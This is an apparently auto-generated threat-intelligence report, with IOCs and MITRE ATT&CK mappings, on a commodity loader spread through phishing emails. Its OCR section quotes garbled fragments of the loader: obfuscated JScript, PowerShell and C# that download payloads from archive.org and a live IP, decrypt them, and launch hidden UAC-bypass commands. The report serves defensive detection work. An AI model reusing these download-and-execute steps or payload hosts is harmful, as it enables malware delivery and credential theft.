# Stealth in Layers: Unmasking the Loader used in Targeted Email Campaigns

## 📋 Report Metadata

**Issue:** [#14](https://github.com/apps-dfir/Security-Operations/issues/14)<br>
**Analyst:** Apramey 'Apps' Shurpali<br>
**Generated:** 2026-01-08 15:21:27 UTC<br>
**Sources Processed:** 1<br>
**OCR Enabled:** Yes

## 📚 Sources

1. [Unmasking The Loader Used In Targeted Email Campaigns](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)

## 📊 Report Summary

**Total Unique IOCs:** 32<br>
**High Confidence IOCs:** 26<br>
**MITRE ATT&CK Techniques:** 30<br>
**Images with OCR Data:** 35<br>
**Breakdown:** CVEs: 1, URLs: 7, Domains: 16, IPs: 2, SHA256: 6

## Executive Summary (Analyst Fill-In)

### Key Takeaways
- What happened (1-2 bullets)
- Who/what is affected (orgs, sectors, regions)
- Why it matters to us (risk / exposure / priority)

### Initial Assessment
- Confidence level: (low/med/high)
- Recommended actions: (monitor / hunt / block / brief)

### Workflow Feedback (Analyst Fill-In)
- Extraction quality: (good / acceptable / poor)
- False positives noted: (none / some / many)
- Missing IOCs observed: (none / list below)
- Parsing issues: (none / describe)
- Suggestions for improvement:

## 🔍 Consolidated Indicators of Compromise

> IOCs are deduplicated across sources. Confidence: 🟢 HIGH | 🟡 MEDIUM | 🔴 LOW

### CVEs

- 🟢 `CVE-2017-11882` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)

### URLs

- 🟢 `hxxp://192[.]3[.]101[.]161/zeus/ConvertedFile[.]txt` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🟢 `hxxp://dn710107[.]ca[.]archive[.]org/0/items/msi-pro-with-b-64_20251208_1511/MSI_PRO_with_b64[.]png` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🟢 `hxxps://ia801706[.]us[.]archive[.]org/25/items/msi-pro-with-b-64_20251208/MSI_PRO_with_b64[.]png` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🟢 `hxxps://pixeldrain[.]com/api/file/7B3Gowyz` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🟢 `hxxps://www[.]nextron-systems[.]com/2025/05/23/katz-stealer-threat-analysis` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🟢 `hxxps://www[.]seqrite[.]com/blog/steganographic-campaign-distributing-malware` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🟢 `hxxps://www[.]zscaler[.]com/blogs/security-research/blindeagle-targets-colombian-government-agency-caminho-and-dcrat` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)

### Domains

- 🟢 `Archive[.]org` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🟢 `Reflection[.]Assembly` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🟢 `Win32[.]TaskScheduler` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🟢 `dn710107[.]ca` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🟢 `ia801706[.]us` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🟢 `pixeldrain[.]com` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🟢 `systems[.]com` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🟢 `www[.]nextron` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🟢 `www[.]seqrite` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🟢 `www[.]zscaler` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🔴 `602450[.]js` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🔴 `602450[.]rar` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🔴 `AddInProcess32[.]exe` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🔴 `ConvertedFile[.]txt` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🔴 `MSBuild[.]exe` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🔴 `RegAsm[.]exe` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)

### IP Addresses

- 🟢 `192[.]3[.]101[.]161` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🟢 `38[.]49[.]210[.]241` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)

### File Hashes

**SHA256:**
- 🟢 `0f1fdbc5adb37f1de0a586e9672a28a5d77f3ca4eff8e3dcf6392c5e4611f914` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🟢 `3dfa22389fe1a2e4628c2951f1756005a0b9effdab8de3b0f6bb36b764e2b84a` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🟢 `5c0e3209559f83788275b73ac3bcc61867ece6922afabe3ac672240c1c46b1d3` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🟢 `917e5c0a8c95685dc88148d2e3262af6c00b96260e5d43fe158319de5f7c313e` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🟢 `bb05f1ef4c86620c6b7e8b3596398b3b2789d8e3b48138e12a59b362549b799d` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)
- 🟢 `c1322b21eb3f300a7ab0f435d6bcf6941fd0fbd58b02f7af797af464c920040a` [[1]](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/)

## 🎯 MITRE ATT&CK Techniques

| Technique | Sources |
|-----------|---------|
| T1005: Data from Local System | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1027.003: Obfuscated Files or Information | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1027.009: Embedded Payloads | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1027: Obfuscated Files or Information | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1036.005: Masquerading | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1036: Masquerading | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1041: Exfiltration Over C2 Channel | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1047: Windows Management Instrumentation | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1055.012: Process Injection | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1059.001: Command and Scripting Interpreter | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1059.007: Command and Scripting Interpreter | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1063: Security Software Discovery | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1082: System Information Discovery | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1093: Process Hollowing | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1102: Web Service | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1114: Email Collection | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1190: Exploit Public-Facing Application | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1204.002: User Execution | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1213.006: Databases | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1497.003: Virtualization/Sandbox Evasion | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1518.001: Software Discovery | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1548.002: Abuse Elevation Control Mechanism | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1552.001: Unsecured Credentials | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1552: Unsecured Credentials | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1555.003: Credentials from Password Stores | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1555.005: Password Managers | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1555: Credentials from Password Stores | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1566.001: Phishing | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1592.001: Hardware | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |
| T1620: Reflective Code Loading | [1](https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/) |

## 📄 Source Details

> Expand each source for detailed information extracted from that article.

<details>
<summary><strong>Source 1: Unmasking The Loader Used In Targeted Email Campaigns</strong></summary>

**URL:** https://cyble.com/blog/stealth-in-layers-unmasking-loader-in-targeted-email-campaigns/

**IOCs from this source:** 32<br>
**MITRE techniques:** 30

**Excerpt:**
> Stealth in Layers: Unmasking the Loader used in Targeted Email Campaigns CRIL has identified a commodity loader being leveraged by various threat actors in targeted email campaigns. Executive Summary CRIL (Cyble Research and Intelligence Labs) has been tracking a sophisticated commodity loader utilized by multiple high-capability threat actors. The campaign demonstrates a high degree of regional and sectoral specificity, primarily targeting Manufacturing and Government organizations across Italy...

</details>

## 🔍 OCR Extracted Content

> Images extracted from source documents with OCR text. Click to expand each image.

<details>
<summary><strong>Image 1</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_001_7ed2a21c1605.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_001_7ed2a21c1605.png)

**Extracted Text:**
> @CVYBLE.

</details>

<details>
<summary><strong>Image 2</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_002_1ee34c0a5724.webp](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_002_1ee34c0a5724.webp)

**Extracted Text:**
> “'CybleBlogs  @cVBLE.  Initial Access Sales Accelerated Across Australia and New Zealand in 2025

</details>

<details>
<summary><strong>Image 3</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_004_64f549c14d7d.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_004_64f549c14d7d.jpg)

**Extracted Text:**
> @CcVBLE.  Cyber Exposure in 2026: Why j Enterprises Across APAC and | Europe Need Attack Surface J ; Management

</details>

<details>
<summary><strong>Image 4</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_005_7d124b15c164.webp](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_005_7d124b15c164.webp)

**Extracted Text:**
> Gartner. 4.8/5 a) Peer Insights. ww wwkn

</details>

<details>
<summary><strong>Image 6</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_007_1bfb7954c37d.webp](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_007_1bfb7954c37d.webp)

**Extracted Text:**
> @CcYBLE.  GLOBAL CYBERSECURITY REPORT 2025

</details>

<details>
<summary><strong>Image 7</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_008_dedeb5a22a00.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_008_dedeb5a22a00.jpg)

**Extracted Text:**
> @CYBLE.  CYBLE SECURES£Z3:7,\21¢]3;] ACROSS 8 CATEGORIES 1S 1G2 FALL 2025  Regional | Regional Leader Leader Le  Easiest [[ Momentum} High High To Use Leader Performer Performer  a? [op wes Trait 2025 TG Best  Usability  Leader

</details>

<details>
<summary><strong>Image 8</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_009_8437f64b8758.gif](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_009_8437f64b8758.gif)

**Extracted Text:**
> @CYBLE.  Follow us on Linked [fi Be Cyber-ready. |  Stay #CybleSecure.

</details>

<details>
<summary><strong>Image 9</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_010_f024f51384fe.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_010_f024f51384fe.jpg)

**Extracted Text:**
> @CYBLE.  Stealth in Layers: Unmasking the Loader used in Targeted email campaigns

</details>

<details>
<summary><strong>Image 10</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_011_99e165d3999b.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_011_99e165d3999b.png)

**Extracted Text:**
> Ema  attachments  - A-® n  Fhexpsa801706 us archive Jrg/2S/temsimsi-pro-with-b-64 20251208MSI_PRO_with_b64lJpng | nopdanrotorce ‘archive orgitemsimst-pro-wth-b-64 20251208. 1511/MS|_PRO_with_b64{ Jong  Invokes  ha  ‘hxcxps:/pixeldrain| Joomlapiile7BSGOwyz Loader hnexp192.3.101.161/zeus/ConvertedFilel Jot  Win32_ProcessStartup  RegAsm exe MSBuild exe Aare 15532. exe  ©0066  PureLog Stealer  XWorm katz_stealer DC Rat Remcos

</details>

<details>
<summary><strong>Image 11</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_013_30802f468b3f.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_013_30802f468b3f.jpg)

**Extracted Text:**
> <Mail Sospetta> [SPF KO] Order Placement PO 602450  ar) Arjun u ippingk  | eS  Valued Supplier,  We would like to place the enclosed attached purchase order (PO) with you. PO No 602450  Together with this PO you will receive a separate e-mail for each artwork of this PO. In case there are more than one item within our PO artwork as there are items covered by this PO. Please check immediately after the reception of the PO that you have gotten all relevant without delay.  For processing reasons we...

</details>

<details>
<summary><strong>Image 12</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_014_387f79cf9304.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_014_387f79cf9304.jpg)

**IOCs Found:**
- `scatt.getparentfoldername`
- `this.yardage`
- `wscript.scriptfullname`

**Extracted Text:**
> Nae scate = new activexohj«cil— i ee var erand = scatt.GetParentFolderName (WScript.ScriptFullName) ;  var retourn = "sho @ls'q ils Ao @ls @ cl $9 ALE) 4AN OIE Gy cE KAM @IE* ty aE ecAol Ole Gy ALE gion  2.8]  var yardage = yardage t= "i pce illo yardage t= "1 Pecillo yardage t= "1 Bp zig ilere yardage t= ".Bpzio¢/lvren_ yardage += " | Ini@pzicw’  a xen _ Pers: Dez Weron_Phes Dez /iilren_ G11 -Noi dr zh leen_¢ Profs deze wf Ween_¢ ste: Deze f Uileren_Pm.Tei Dp zie ebon_A xt .Encoi Bp gh f lelren...

</details>

<details>
<summary><strong>Image 13</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_015_0a76a17b3a05.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_015_0a76a17b3a05.png)

**IOCs Found:**
- `this.yardage`
- `strake.get`
- `utf8.getstring`
- `system.text`
- `system.convert`
- `scatt.getparentfoldername`
- `stirpiculture.create`
- `scripting.filesystemobject`
- `wined.showwindow`
- `wscript.sleep`

**Extracted Text:**
> var scatt = new ActiveXObject ("Scripting.FileSystemObject"); var erand = scatt.GetParentFolderName (WScript .ScriptFullName: var retourn =  /SUV4KCgnbTZyY 2F OY 2hkcmFpbiA9IES1dy1PYmp1¥3QgUycrJ31zdGVtLk51dC5X2ZWJDbG11bnQ7bTZyY2FOY2hkcmFbi 5. IAXMC 4wOyBXaW4 2NDsgeDYOKSBBCHBSZVd1YktpdC8 1MzcuMzYgKEt IVE1MLCBsaScrJ2t1IEd1Y2tvKSBDaHInKydvbWUvMT RUCOF} Y2VwdHRucywgdG5zdGV4dC90dG1 sLGEwcGxpY2F0aScrJ28nkyduL3hodG1sK3htbCxhcHBsaWNhdG1vbi 94byw7c HC1MJysnYWSndWEnZXRucywgdG52z2W4tVVMsZW47cTOwLj 1 0bnMp0...

</details>

<details>
<summary><strong>Image 14</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_016_28bd893cfce1.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_016_28bd893cfce1.jpg)

**IOCs Found:**
- `ascii.getstring`
- `headers.add`
- `ia801706.us`
- `system.net`
- `reflection.assembly`
- `webclient.headers`

**Extracted Text:**
> §$webClient = New-Object System.Net.WebClient $webClient .Headers.Add("User-agent", "Mozilla/5.0 $webClient. Headers.Add("A\ xt/html, app] $webClient.Headers.Add("Accept-Language", "en-US, en;  winea; x64)") xml, application/xml:  .9)4/*  mérb64url =[hexps://ia801706.us.archive[.]org/2s/items/msi-pro-with-b-64_20251208/MSI_PRO with bé4.pngj] mérequilibria = .DownloadData (mérocmulgee) 7 mérdisincorporate = [System. Text .'+'Encoding] : :ASCII.GetString (mérequilibria) ;  4f (m6rdisincorporate -m...

</details>

<details>
<summary><strong>Image 15</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_017_ccf7e10aa50e.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_017_ccf7e10aa50e.jpg)

**Extracted Text:**
> 4 Bl MSI_PRO_with_b64.png  15 37B0: 15 37c0 15 37D0: 15 37E0: 15 37FO: 15 3800 15 3810 15 3820 15 3830 15 3840 15 3850: 15 3860: 3870: i  00,01, 02,03, 04,0506 07 , 08,09,0A 0B , oC OD aw OF 012345678 9ABCDBE, 98 FA C3 B2 7B 48 DAC4 7C CD A2 01 2¢ B6 AC 68 97 1056 AS 4F 43 OD AS DE CB D7 SE ES DB 84 5B CO 8C FA 6D F3 0E DC D3 Ag 35 0A 4E 4E BB OS4 D2 45 FB 57 3C EF 69 A9 D9 C8 62 9E 09 3D 64 61 9F 88 46 4C 08 23 23 F4 1D 1F 5B 47 9B 94 EF 30 38 9A DA 43 97 CC 46 3A 3F AB 83 D7 15 1F 99 BF 97 7C...

</details>

<details>
<summary><strong>Image 16</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_018_d169c0912dc2.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_018_d169c0912dc2.jpg)

**IOCs Found:**
- `system.security`
- `duler.dil`
- `2.12.1.0`
- `win32.taskscheduler`

**Extracted Text:**
> 401 Microsoft Win32.TaskScheduler (2.12.1.0) Microsoft. Win  duler.dil  Type References References Resources JetBrains Annotations  Microsoft Win32  Microsoft Win32.TaskScheduler  Microsoft Win32.TaskScheduler.Fluent Microsoft Win32.TaskScheduler. Properties Microsoft Win32.TaskScheduler.V1Interop Microsoft Win32.TaskScheduler.V2interop System  System Reflection  ‘System Runtime InteropServices ‘System.Security.AccessControl  oft. Win32.TaskScheduler.dil  PE Type References References Resources...

</details>

<details>
<summary><strong>Image 17</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_019_ad7ad6bfcc3f.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_019_ad7ad6bfcc3f.jpg)

**IOCs Found:**
- `convertedfile.txt`
- `192.3.101.161`
- `system.net`

**Extracted Text:**
> Name  \u0020 \u0020 \u0020 \u0020 webClient text3 num2 text2  text  vv ©0000 OOOO  Value “==Ad4RnLixWaGRWZOJXZ252bD9yc1 VmevEjNx4SMweEjLz4iMSEzLvoDcORHa" “abcd” “RegAsm" “RegAsm" {System.Net.WebClient} “aHROcDovLzE5Mi4zLjEwMS4xNjEvemV1 cy9Db25"—™ IN7\WIRGa\Nx|LnR4dA= 0x00000016 CT eel | “http://192.3.101.161 /zeus/ConvertedFile.txt” AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAL

</details>

<details>
<summary><strong>Image 18</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_020_f89a518354a3.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_020_f89a518354a3.jpg)

**IOCs Found:**
- `regasm.exe`
- `regasm.cxe`

**Extracted Text:**
> 139  140 aa 142 ® 13 IClassi1.delegate9_o(object null, ref object_o. stru 14a hate 145 if (1flaga) 146 A 147 object_@.int_1 = sitConverter.Tornt32(ebject_@.object ©, 60); 1 cote ti ae1s wow toae Name Value Type © ins ‘00000000 int © ins --xc0000000 int © (MFASFGNU " @°cAWindows\ Microsoft NET\Framework\v4.0:30319\RegAsm.cxe” string > object a object iby © ‘string. 0 string © string.1 (@C\Windows\ Microsoft NET\Framework\v4.0:30319\RegAsm.exe" ‘string

</details>

<details>
<summary><strong>Image 19</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_021_bbfd76a92e5f.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_021_bbfd76a92e5f.jpg)

**IOCs Found:**
- `compressionmode.decompress`
- `gzipstream.read`
- `tripledescryptoserviceprovider.mode`
- `memorystream.toarray`
- `memorystream2.read`
- `tripledescryptoserviceprovider.padding`
- `cryptostream.wirite`
- `ciphermode.cac`
- `cryptostream.flushfinalblock`
- `tripledescryptoserviceprovider.createdecryptor`

**Extracted Text:**
> TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider} tripleDescryptoServiceProvider.Mode = CipherMode.cac; tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7; tripleDESCryptoServiceProvider.«<y = byte_1; triplepescryptoServiceprovider.1v = byte_2;  using (MemoryStream memoryStream = new MemoryStream())  {  using (CryptoStream cryptoStream = new CryptoStream(memoryStream, tripleDEscryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.write))  cryptoStream.Wirite(byte_@, 0, b...

</details>

<details>
<summary><strong>Image 20</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_022_fc966b903d66.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_022_fc966b903d66.jpg)

**Extracted Text:**
> Dem References 0 >O 70  0  c ¢ ( c  >O  >O  >O 4% 502000168  40 g Mil Base Type and interfaces 7 Ill Derived Types  ace ype  Base Type and Interfaces Derived Types

</details>

<details>
<summary><strong>Image 21</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_023_5fbf6d8022a3.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_023_5fbf6d8022a3.jpg)

**IOCs Found:**
- `psi.windowstyle`
- `psi.verb`
- `psi.arguments`
- `psi.createnowindow`
- `processwindowstyle.hidden`
- `psi.filename`
- `psi.useshellexecute`
- `process.start`
- `powershell.exe`

**Extracted Text:**
> if (currentProcessCount > initialProcessCount)  LogUAC("*** PROCESS COUNT INCREASED *** From " + initialProcessCount + " to “ + currentProcessCount) ;  LogUAC("Executing enhanced UAC PowerShell command...  string obfuscatedCmd = BuildObfuscatedCommand();  ProcessStartInfo psi = new ProcessStartInfo(); psi.FileName = "powershell.exe";  psi.Arguments = "-WindowStyle Hidden " + obfuscatedCmd; psi.WindowStyle = ProcessWindowStyle.Hidden; psi.CreateNoWindow = true;  psi.UseShellExecute = true;  psi.V...

</details>

<details>
<summary><strong>Image 22</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_024_5aff03b5b494.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_024_5aff03b5b494.jpg)

**Extracted Text:**
> Help  [2025-12-16 [2025-12-16 [2025-12-16 [2025-12-16 [2025-12-16 [2025-12-16 [2025-12-16 [2025-12-16 [2025-12-16 [2025-12-16 [2025-12-16 [2025-12-16 [2025-12-16 [2025-12-16  15: 15: 15: 15: 15: 15: 15: 15: aS 15: 15; 15: 15: 15:  56: 56: 56: 573 S7: 57: 57: 57: 57: 57: S73 57: 57: 57:  904 .170 +202 +263 544 544 544 -802 -879 645 661 693 .708 -708  === Enhanced UAC V39 Started ===  *** MAIN THREAD BLOCKING MODE WITH ENHANCED UAC *** Starting 1-minute delay in main thread...  1-minute delay comp...

</details>

<details>
<summary><strong>Image 23</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_026_a580f76810ad.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_026_a580f76810ad.jpg)

**Extracted Text:**
> @CVYBLE.  Trusted by 1000+ Top brands 75+ Countries  a gr #1, Powered threat Peerinsights. ####*% Intelligence Platfor

</details>

<details>
<summary><strong>Image 24</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_027_1bfb7954c37d.webp](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_027_1bfb7954c37d.webp)

**Extracted Text:**
> @CcYBLE.  GLOBAL CYBERSECURITY REPORT 2025

</details>

<details>
<summary><strong>Image 25</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_028_841b207355ad.webp](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_028_841b207355ad.webp)

**Extracted Text:**
> @CYBLE.  THREAT LANDSCAPE REPORT EUROPE 2025

</details>

<details>
<summary><strong>Image 26</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_029_4a3cbada1bfc.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_029_4a3cbada1bfc.jpg)

**Extracted Text:**
> @CYBLE.  THREAT q LANDSCAPE REPORT APAC 2025

</details>

<details>
<summary><strong>Image 27</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_030_8aab5f03867d.webp](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_030_8aab5f03867d.webp)

**Extracted Text:**
> LANDSCAPE REPORT NORTH AMERICA 2025  @CVBLE THREAT

</details>

<details>
<summary><strong>Image 28</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_031_0569c723df65.webp](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_031_0569c723df65.webp)

**Extracted Text:**
> “— "- a @CYBLE. ng i  THREAT LANDSCAPE REPORT META 2025

</details>

<details>
<summary><strong>Image 29</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_032_90d9e92a98da.webp](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_032_90d9e92a98da.webp)

**Extracted Text:**
> @CYBLE.  THREAT LANDSCAPE REPORT AUSTRALIA AND NEW ZEALAND 2025

</details>

<details>
<summary><strong>Image 30</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_034_8437f64b8758.gif](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_034_8437f64b8758.gif)

**Extracted Text:**
> @CYBLE.  Follow us on Linked [fi Be Cyber-ready. |  Stay #CybleSecure.

</details>

<details>
<summary><strong>Image 31</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_035_1720f9f3ba81.webp](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_035_1720f9f3ba81.webp)

**Extracted Text:**
